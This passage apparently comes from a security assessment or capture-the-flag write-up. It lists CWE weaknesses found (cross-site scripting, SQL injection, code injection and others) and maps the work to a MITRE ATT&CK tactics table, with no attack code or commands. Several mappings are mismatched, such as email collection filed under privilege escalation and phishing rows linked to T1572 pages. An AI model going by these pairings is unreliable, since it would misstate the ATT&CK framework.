| <a id="cwe-79" href="https://cwe.mitre.org/data/definitions/79.html" target="_blank">CWE-79</a> | <a href="#cross-site-scripting" class="vuln-ref">Cross-site Scripting</a> | The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.
| <a id="cwe-89" href="https://cwe.mitre.org/data/definitions/89.html" target="_blank">CWE-89</a> | <a href="#sql-injection" class="vuln-ref">SQL Injection</a> | The product constructs all or part of an SQL command using externally-influenced input from an upstream component.
| <a id="cwe-94" href="https://cwe.mitre.org/data/definitions/94.html" target="_blank">CWE-94</a> | <a href="#code-injection" class="vuln-ref">Code Injection</a> | The product constructs a code segment using externally-influenced input from an upstream component.
| <a id="cwe-328" href="https://cwe.mitre.org/data/definitions/328.html" target="_blank">CWE-328</a> | <a href="#use-of-weak-hash" class="vuln-ref">Use of Weak Hash</a> | The product uses an algorithm does not meet security expectations for a hash.
| <a id="cwe-521" href="https://cwe.mitre.org/data/definitions/521.html" target="_blank">CWE-521</a> | <a href="#weak-password-requirements" class="vuln-ref">Weak Password Requirements</a> | The product does not require that users should have strong passwords.
| <a id="cwe-532" href="https://cwe.mitre.org/data/definitions/532.html" target="_blank">CWE-532</a> | <a href="#insertion-of-sensitive-information-into-log-file" class="vuln-ref">Insertion of Sensitive Information into Log File</a> | The product writes sensitive information to a log file.

---
## MITRE ATT&CK Matrix

| Tactics | Techniques | Sub-Techniques | ID |
| :--- | :--- | :--- | :---: |
| [**`Reconnaissance`**](#reconnaissance) | | | <a href="https://attack.mitre.org/tactics/TA0043/" target="_blank">**`TA0043`**</a>
| | [*Active Scanning*](#active-scanning) | | <a href="https://attack.mitre.org/techniques/T1595/" target="_blank">*T1595*</a>
| | | [*Scanning IP Blocks*](#active-scanning) | <a href="https://attack.mitre.org/techniques/T1595/001/" target="_blank">*T1595.001*</a>
| | | [*Vulnerability Scanning*](#active-scanning) | <a href="https://attack.mitre.org/techniques/T1595/002/" target="_blank">*T1595.002*</a>
| | [*Gather Victim Host Information*](#active-scanning) | | <a href="https://attack.mitre.org/techniques/T1592/" target="_blank">*T1592*</a>
| | | [*Software*](#active-scanning) | <a href="https://attack.mitre.org/techniques/T1592/002/" target="_blank">*T1592.002*</a>
| | [*Search Victim-Owned Websites*](#search-victim-owned-websites) | | <a href="https://attack.mitre.org/techniques/T1594/" target="_blank">*T1594*</a>
| | | [*Wordlist Scanning*](#search-victim-owned-websites) | <a href="https://attack.mitre.org/techniques/T1595/003/" target="_blank">*T1595.003*</a>
| [*Collection*](#email-collection) | | | <a href="https://attack.mitre.org/tactics/TA0009/" target="_blank">*TA0009*</a>
| | [*Data from Information Repositories*](#search-victim-owned-websites) | | <a href="https://attack.mitre.org/techniques/T1213/" target="_blank">*T1213*</a>
| | | [*Code Repositories*](#search-victim-owned-websites) | <a href="https://attack.mitre.org/techniques/T1213/003/" target="_blank">*T1213.003*</a>
| [**`Initial Access`**](#initial-access) | | | <a href="https://attack.mitre.org/tactics/TA0001/" target="_blank">**`TA0001`**</a>
| | [*Exploit Public-Facing Application*](#exploit-public-facing-application) | | <a href="https://attack.mitre.org/techniques/T1190/" target="_blank">*T1190*</a>
| [*Credential Access*](#exploit-public-facing-application) | | | <a href="https://attack.mitre.org/tactics/TA0006/" target="_blank">*TA0006*</a>
| | [*Steal Web Session Cookie*](#exploit-public-facing-application) | | <a href="https://attack.mitre.org/techniques/T1539/" target="_blank">*T1539*</a>
| [*Defense Evasion*](#exploit-public-facing-application) | | | <a href="https://attack.mitre.org/tactics/TA0005/" target="_blank">*TA0005*</a>
| | [*Use Alternate Authentication Material*](#exploit-public-facing-application) | | <a href="https://attack.mitre.org/techniques/T1550/" target="_blank">*T1550*</a>
| | | [*Web Session Cookie*](#exploit-public-facing-application) | <a href="https://attack.mitre.org/techniques/T1550/004" target="_blank">*T1550.004*</a>
| [*Execution*](#exploit-public-facing-application) | | | <a href="https://attack.mitre.org/tactics/TA0002/" target="_blank">*TA0002*</a>
| | [*Command and Scripting Interpreter*](#exploit-public-facing-application) | | <a href="https://attack.mitre.org/techniques/T1059/" target="_blank">*T1059*</a>
| | | [*JavaScript*](#exploit-public-facing-application) | <a href="https://attack.mitre.org/techniques/T1059/007/" target="_blank">*T1059.007*</a>
| | [*Brute Force*](#brute-force) | | <a href="https://attack.mitre.org/techniques/T1110/" target="_blank">*T1110*</a>
| | | [*Password Cracking*](#brute-force) | <a href="https://attack.mitre.org/techniques/T1110/002/" target="_blank">*T1110.002*</a>
| [**`Lateral Movement`**](#lateral-movement) | | | <a href="https://attack.mitre.org/tactics/TA0008/" target="_blank">**`TA0008`**</a>
| | [*Remote Services*](#lateral-movement) | | <a href="https://attack.mitre.org/techniques/T1021/" target="_blank">*T1021*</a>
| | | [*SSH*](#lateral-movement) | <a href="https://attack.mitre.org/techniques/T1021/004" target="_blank">*T1021.004*</a>
| [*Discovery*](#lateral-movement) | | | <a href="https://attack.mitre.org/tactics/TA0007/" target="_blank">*TA0007*</a>
| | [*Account Discovery*](#lateral-movement) | | <a href="https://attack.mitre.org/techniques/T1087/" target="_blank">*T1087*</a>
| | | [*Local Account*](#lateral-movement) | <a href="https://attack.mitre.org/techniques/T1087/001/" target="_blank">*T1087.001*</a>
| | [*File and Directory Discovery*](#lateral-movement) | | <a href="https://attack.mitre.org/techniques/T1083/" target="_blank">*T1083*</a>
| | [*Unsecured Credentials*](#lateral-movement) | | <a href="https://attack.mitre.org/techniques/T1552/" target="_blank">*T1552*</a>
| | | [*Credentials In Files*](#lateral-movement) | <a href="https://attack.mitre.org/techniques/T1552/001/" target="_blank">*T1552.001*</a>
| | | [*SSH*](#lateral-movement) | <a href="https://attack.mitre.org/techniques/T1021/004" target="_blank">*T1021.004*</a>
| [**`Privilege Escalation`**](#privilege-escalation) | | | <a href="https://attack.mitre.org/tactics/TA0004/" target="_blank">**`TA0004`**</a>
| | [*Email Collection*](#email-collection) | | <a href="https://attack.mitre.org/techniques/T1114/" target="_blank">*T1114*</a>
| | | [*Local Email Collection*](#email-collection) | <a href="https://attack.mitre.org/techniques/T1114/001/" target="_blank">*T1114.001*</a>
| | [*Network Service Discovery*](#network-service-discovery) | | <a href="https://attack.mitre.org/techniques/T1046/" target="_blank">*T1046*</a>
| [*Command and Control*](#network-service-discovery) | | | <a href="https://attack.mitre.org/tactics/TA0011/" target="_blank">*TA0011*</a>
| | [*Protocol Tunneling*](#network-service-discovery) | | <a href="https://attack.mitre.org/techniques/T1572/" target="_blank">*T1572*</a>
| | [*Exploitation for Client Execution*](#exploitation-for-client-execution) | | <a href="https://attack.mitre.org/techniques/T1203/" target="_blank">*T1203*</a>
| | [*Phishing*](#exploitation-for-client-execution) | | <a href="https://attack.mitre.org/techniques/T1572/" target="_blank">*T1566*</a>
| | | [*Spearphishing Link*](#exploitation-for-client-execution) | <a href="https://attack.mitre.org/techniques/T1572/002/" target="_blank">*T1566.002*</a>
| [*Exfiltration*](#exfiltration-over-c2-channel) | | | <a href="https://attack.mitre.org/tactics/TA0010/" target="_blank">*TA0010*</a>
| | [*Exfiltration Over C2 Channel*](#exfiltration-over-c2-channel) | | <a href="https://attack.mitre.org/techniques/T1041/" target="_blank">*T1041*</a>
| | | [*Credentials In Files*](#exfiltration-over-c2-channel) | <a href="https://attack.mitre.org/techniques/T1552/001/" target="_blank">*T1552.001*</a>
| | [*Valid Accounts*](#exfiltration-over-c2-channel) | | <a href="https://attack.mitre.org/techniques/T1078/" target="_blank">*T1078*</a>
| | | [*Local Accounts*](#exfiltration-over-c2-channel) | <a href="https://attack.mitre.org/techniques/T1078/003/" target="_blank">*T1078.003*</a>
